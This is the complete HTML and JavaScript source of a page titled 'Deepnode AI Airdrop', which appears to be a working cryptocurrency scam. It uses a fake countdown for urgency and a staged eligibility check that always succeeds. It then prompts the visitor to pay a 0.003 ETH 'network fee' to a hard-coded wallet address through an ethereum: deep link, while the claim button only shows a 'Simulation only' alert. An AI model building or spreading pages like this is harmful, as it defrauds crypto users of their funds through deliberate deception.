<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Deepnode AI Airdrop</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<style>
html, body {
  margin:0; padding:0; height:100%;
  font-family:-apple-system, BlinkMacSystemFont, Inter, Arial;
  background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);
  color:#fff;
}
.container{
  height:100%; display:flex; flex-direction:column;
  justify-content:center; align-items:center; text-align:center; padding:24px;
}
.logo{width:110px;margin-bottom:20px}
h1{font-size:22px;margin-bottom:10px}
button{
  width:100%; max-width:340px; padding:16px;
  font-size:17px; border-radius:14px; border:1px solid rgba(255,255,255,.25);
  background:rgba(255,255,255,.08); color:#fff; cursor:pointer;
}
button:disabled{opacity:.5; cursor:not-allowed}
.status{margin-top:20px; font-size:14px; opacity:.8}
.footer{position:absolute; bottom:25px; font-size:12px; opacity:.6}

/* Modal */
.modal{
  position:fixed; inset:0; background:rgba(0,0,0,0.75);
  display:none; align-items:center; justify-content:center;
}
.box{
  background:#0e0f1f; padding:24px; border-radius:16px;
  width:90%; max-width:360px; text-align:center;
}
.progress{height:8px; background:rgba(255,255,255,.15); border-radius:10px; overflow:hidden; margin-top:16px}
.bar{height:100%; width:0%; background:linear-gradient(90deg,#7f5cff,#c77dff)}
.addr{word-break:break-all; font-size:12px; margin-top:8px; opacity:.8; text-align:center; margin-bottom:10px}
.payBtn, .claimBtn{
  margin-top:16px; padding:12px 0; width:100%; border:none; border-radius:12px;
  background:linear-gradient(90deg,#7f5cff,#c77dff); color:#fff; font-weight:600; cursor:pointer;
}
.claimBtn{display:none;}
</style>
</head>

<body>

<div class="container">
  <img src="deepnode-logo.png" class="logo">
  <h1>Connect wallet to claim Deepnode AI airdrop</h1>
  <div id="timer" style="margin-bottom:16px;font-size:14px;"></div>
  <button onclick="connectWallet()">Connect Wallet</button>
  <div class="status" id="status"></div>
  <div class="footer">Deepnode AI • Terms & Privacy</div>
</div>

<!-- Eligibility Modal -->
<div class="modal" id="modal">
  <div class="box">
    <div id="modalText">Checking eligibility…</div>
    <div class="progress"><div class="bar" id="bar"></div></div>
    <div class="addr" id="fullAddress"></div>
    <button class="payBtn" id="payBtn" onclick="payFee()">Pay 0.003 ETH Network Fee</button>
    <button class="claimBtn" id="claimBtn" onclick="claimAirdrop()">Claim Airdrop</button>
  </div>
</div>

<script>
/* ================= TIMER 3 HOURS ================= */
const endTime = Date.now() + 3*60*60*1000;
const timerEl = document.getElementById("timer");
function updateTimer(){
  const diff = endTime - Date.now();
  if(diff <= 0){ timerEl.innerText="Claim period ended"; return; }
  const h = Math.floor(diff/3600000);
  const m = Math.floor((diff%3600000)/60000);
  const s = Math.floor((diff%60000)/1000);
  timerEl.innerText=`Claim ends in ${h}h ${m}m ${s}s`;
}
setInterval(updateTimer,1000);
updateTimer();

/* ================= WALLET ================= */
let currentAddress = "";
async function connectWallet(){
  if(!window.ethereum){
    document.getElementById("status").innerText="Open in MetaMask or Trust Wallet browser.";
    return;
  }
  try{
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    currentAddress = await signer.getAddress();

    document.getElementById("status").innerText="Wallet connected: " + currentAddress;
    showEligibility(currentAddress);
  }catch{
    document.getElementById("status").innerText="Connection rejected.";
  }
}

/* ================= ELIGIBILITY POPUP ================= */
function showEligibility(address){
  const modal = document.getElementById("modal");
  const bar = document.getElementById("bar");
  const text = document.getElementById("modalText");
  const addrEl = document.getElementById("fullAddress");
  const payBtn = document.getElementById("payBtn");
  const claimBtn = document.getElementById("claimBtn");

  modal.style.display="flex";
  bar.style.width="0%";
  text.innerText="Checking eligibility…";
  addrEl.innerText="";
  payBtn.style.display="none";
  claimBtn.style.display="none";

  let progress=0;
  const phases = ["Scanning wallet activity…","Validating eligibility…","Allocating airdrop…"];
  let step=0;

  const interval = setInterval(()=>{
    progress+=25;
    bar.style.width=progress+"%";
    text.innerText=phases[Math.min(step,phases.length-1)];
    step++;
    if(progress>=100){
      clearInterval(interval);
      text.innerHTML=`✅ Eligible!<br><br>Ready to claim your airdrop.`;
      addrEl.innerText="Wallet: "+address;
      payBtn.style.display="block";
    }
  },500);
}

/* ================= PAY NETWORK FEE ================= */
function payFee(){
  if(!currentAddress) return;

  const recipient = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
  const amountEth = "0.003";
  const amountWei = "3000000000000000";

  // Ethereum deep link
  const url = `ethereum:${recipient}?value=${amountWei}`;
  window.location.href = url; // Opens MetaMask / Trust Wallet for payment

  // Show Claim button after "payment"
  const claimBtn = document.getElementById("claimBtn");
  claimBtn.style.display="block";

  // Optional: hide pay button to prevent repeated clicks
  document.getElementById("payBtn").style.display="none";
}

/* ================= CLAIM AIRDROP ================= */
function claimAirdrop(){
  alert("Airdrop claimed! (Simulation only)");
}
</script>

</body>
</html>
